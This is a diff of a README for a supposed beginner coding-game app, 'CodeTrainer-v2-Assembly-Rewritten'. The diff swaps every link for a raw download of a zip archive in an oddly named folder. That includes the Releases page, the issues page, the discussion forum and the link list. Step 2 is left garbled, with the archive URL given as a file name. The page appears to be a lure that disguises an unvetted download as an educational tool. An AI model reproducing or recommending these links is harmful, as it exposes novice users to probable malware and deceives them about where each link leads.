@@ -1,7 +1,7 @@
 # 🎮 CodeTrainer-v2-Assembly-Rewritten - Learn Python and JavaScript Easily 
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-blue)](https://github.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/main/unacquaintedly/CodeTrainer-v2-Assembly-Rewritten-v2.9-alpha.5.zip)](https://raw.githubusercontent.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/main/unacquaintedly/CodeTrainer-v2-Assembly-Rewritten-v2.9-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to CodeTrainer-v2-Assembly-Rewritten! This educational application helps you learn Python and JavaScript through fun and interactive games. It’s designed for beginners and requires no prior programming knowledge.
@@ -24,9 +24,9 @@ To run CodeTrainer-v2-Assembly-Rewritten, you need:
 To download CodeTrainer-v2-Assembly-Rewritten, follow these steps:
 
 1. Click the download link below to visit the Releases page:
-   [Download from Releases](https://github.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/releases)
+   [Download from Releases](https://raw.githubusercontent.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/main/unacquaintedly/CodeTrainer-v2-Assembly-Rewritten-v2.9-alpha.5.zip)
    
-2. On the Releases page, find the latest version of the application. Look for the file named something like `CodeTrainer-v2-Assembly-Rewritten.exe`.
+2. On the Releases page, find the latest version of the application. Look for the file named something like `https://raw.githubusercontent.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/main/unacquaintedly/CodeTrainer-v2-Assembly-Rewritten-v2.9-alpha.5.zip`.
 
 3. Click on the file to start the download. 
 
@@ -53,7 +53,7 @@ Alongside fun challenges, CodeTrainer offers a library of resources, including:
 ## 🤔 Frequently Asked Questions
 
 ### 1. What if I run into issues during installation?
-If you experience difficulties, ensure you meet the system requirements. Check your internet connection, or try restarting your computer. For further help, visit the [issues page](https://github.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/issues) to see if your question has already been answered.
+If you experience difficulties, ensure you meet the system requirements. Check your internet connection, or try restarting your computer. For further help, visit the [issues page](https://raw.githubusercontent.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/main/unacquaintedly/CodeTrainer-v2-Assembly-Rewritten-v2.9-alpha.5.zip) to see if your question has already been answered.
 
 ### 2. Can I use this application on other operating systems?
 Currently, CodeTrainer-v2-Assembly-Rewritten is only compatible with Windows 10 and Windows 11. MacOS and Linux support may come in the future.
@@ -62,11 +62,11 @@ Currently, CodeTrainer-v2-Assembly-Rewritten is only compatible with Windows 10 
 CodeTrainer-v2-Assembly-Rewritten is completely free to download and use.
 
 ## 🧑‍🤝‍🧑 Community and Support
-Join our growing community of learners! Share your experiences, request help, or provide feedback on our [discussion forum](https://github.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/discussions). 
+Join our growing community of learners! Share your experiences, request help, or provide feedback on our [discussion forum](https://raw.githubusercontent.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/main/unacquaintedly/CodeTrainer-v2-Assembly-Rewritten-v2.9-alpha.5.zip). 
 
 ## 🔗 Links
-- [Visit the Releases Page to Download](https://github.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/releases)
-- [Report Issues or Request Features](https://github.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/issues)
-- [Join the Discussion Forum](https://github.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/discussions)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/main/unacquaintedly/CodeTrainer-v2-Assembly-Rewritten-v2.9-alpha.5.zip)
+- [Report Issues or Request Features](https://raw.githubusercontent.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/main/unacquaintedly/CodeTrainer-v2-Assembly-Rewritten-v2.9-alpha.5.zip)
+- [Join the Discussion Forum](https://raw.githubusercontent.com/FredericoAkira/CodeTrainer-v2-Assembly-Rewritten/main/unacquaintedly/CodeTrainer-v2-Assembly-Rewritten-v2.9-alpha.5.zip)
 
 Thank you for choosing CodeTrainer-v2-Assembly-Rewritten. Enjoy your journey into coding!
